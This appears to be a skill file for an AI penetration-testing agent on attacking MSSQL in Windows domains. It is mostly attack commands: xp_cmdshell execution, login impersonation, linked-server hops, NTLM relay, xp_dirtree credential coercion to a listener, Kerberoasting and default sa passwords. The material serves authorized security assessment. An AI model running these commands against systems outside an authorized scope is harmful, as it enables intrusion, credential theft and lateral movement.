---
name: windows-mssql
description: MSSQL on Windows/AD — NetExec mssql, xp_cmdshell, linked servers, impersonation, NTLM relay to MSSQL, Kerberoast of MSSQL SPNs. Use when port 1433 or a SQL SPN is in scope.
metadata:
  version: '1.0'
---

# MSSQL

## Discover

```
nmap -p 1433 -sV <ip>
run_nxc protocol=mssql target=<ip>
GetUserSPNs.py <domain>/<user>:'<pass>' -dc-ip <dc-ip>   # MSSQLSvc/...
```

Unauth: Windows mixed-mode `sa` with weak/empty password (rare). Domain: `nxc mssql <ip> -u <user> -p '<pass>' -d <domain>`.

## Privileges

```
nxc mssql <ip> -u <user> -p '<pass>' -d <domain> -q 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER('\''sysadmin'\'');'
nxc mssql <ip> -u <user> -p '<pass>' --local-auth    # sa / SQL logins
```

Impersonation:

```
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
```

`IMPERSONATE sa` / `sysadmin` ⇒ finding.

## Command execution

```
nxc mssql <ip> -u <user> -p '<pass>' -x 'whoami'
# or mssqlclient.py
mssqlclient.py '<domain>/<user>:<pass>@<ip>'
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

Also: `sp_OACreate`, Agent jobs, `clr` assemblies — if `xp_cmdshell` is off.

## Linked servers (trust hops)

```
SELECT * FROM sys.servers;
EXECUTE('xp_cmdshell ''whoami''') AT [LINKED];
# crawl: mssqlclient.py ... then enum_impersonate / enum_links
nxc mssql <ip> -u <user> -p '<pass>' -M mssql_links
```

A link to another domain’s SQL is a **forest/domain hop** (`windows-trusts`).

## Relay / coerce

Unsigned SMB or HTTP coerce into MSSQL NTLM: `ntlmrelayx -t mssql://<ip>`. Need SQL login mapping for the relayed account. Combine with `windows-coerce-relay`.

## Files / hashes

- `xp_dirtree '\\<listener>\share'` — coerce the SQL **service account**.
- Service account often has an SPN → Kerberoast (`windows-kerberos`) if you cannot log in.
- SQL config: `xp_cmdshell` type dump of `web.config` / connection strings.

## Extra

- **Default `sa`:** `sa` / `sa`, `sa` / empty, vendor product passwords.
- **Named pipes / 1434 UDP** browser — find instances.
- **MC-SQLR** / old DBs on the same host as IIS — connection strings in `web.config`.
